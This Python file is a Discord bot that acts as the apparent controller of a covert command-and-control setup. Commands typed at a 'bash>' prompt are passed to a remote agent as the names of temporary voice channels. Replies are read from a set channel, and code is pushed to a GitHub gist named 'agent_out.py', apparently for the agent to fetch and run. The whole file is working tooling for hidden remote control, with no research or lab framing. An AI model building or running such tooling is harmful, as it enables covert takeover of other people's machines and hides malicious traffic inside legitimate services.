import asyncio
import threading
import discord
import os
import urllib.request, json
from discord.ext import commands

# bot permission to read messages in channels
intents = discord.Intents.none()
intents.guilds = True           
intents.guild_messages = True   
intents.message_content = True  
bot = commands.Bot(command_prefix="!", intents=intents)

token = os.getenv("DISCORD_BOT_TOKEN")  
output_channel_id = int(os.getenv("DISCORD_OUTPUT_CHANNEL_ID"))  
guild_id = int(os.getenv("DISCORD_GUILD_ID"))

gist_token = os.getenv("GIST_TOKEN")
gist_id = os.getenv("GIST_ID")

def update_gist(content):
    data = json.dumps({
        "files": {
            "agent_out.py": {
                "content": content
            }
        }
    }).encode()

    req = urllib.request.Request(
        f"https://api.github.com/gists/{gist_id}",
        data=data,
        method="PATCH",
        headers={
            "Authorization": f"token {gist_token}",
            "Content-Type": "application/json",
            "Accept": "application/vnd.github.v3+json"
        }
    )

    with urllib.request.urlopen(req) as r:
        result = json.load(r)
        print("Updated:", result["updated_at"])

# Create a channel named after the command
async def send_command(cmd):
    guild = bot.get_guild(guild_id)
    channel = await guild.create_voice_channel(cmd)
    await getcmdoutput(channel)

# Wait for a message in the newly created channel
async def getcmdoutput(channel):
    try:
        reply = await bot.wait_for(
            "message",
            check=lambda m: m.channel.id == output_channel_id and m.author != bot.user,
            timeout=30.0,
        )
        print(f"{reply.author}: {reply.content}")
    except asyncio.TimeoutError:
        print("No response within 30 seconds.")
        update_gist("exit(0)")
    finally:
        await channel.delete()
        print(f"Deleted channel: {channel.name}")

def input_loop(loop):
    first = True
    try:
        while True:
            cmd = input("bash> ").strip()
            if not cmd:
                continue
            try:
                send = asyncio.run_coroutine_threadsafe(send_command(cmd), loop)
                send.result()
                if first:
                    update_gist("exit(0)")
                    first = False
            except Exception as e:
                print(f"Error: {e}")
    except KeyboardInterrupt:
        exit(0)

@bot.event
async def on_ready():
    print(bot.user.name + " has connected to Discord!")
    if not getattr(bot, "input_started", False):
        bot.input_started = True
        loop = asyncio.get_running_loop()
        threading.Thread(target=input_loop, args=(loop,), daemon=True).start()


@bot.command(name="newest")
async def get_newest_message(ctx):
    channel = bot.get_channel(output_channel_id)
    if channel:
        async for message in channel.history(limit=1):
            await ctx.send(f"{message.author}: {message.content}")
            print(message.content)
    else:
        await ctx.send("Channel not found.")
bot.run(token)  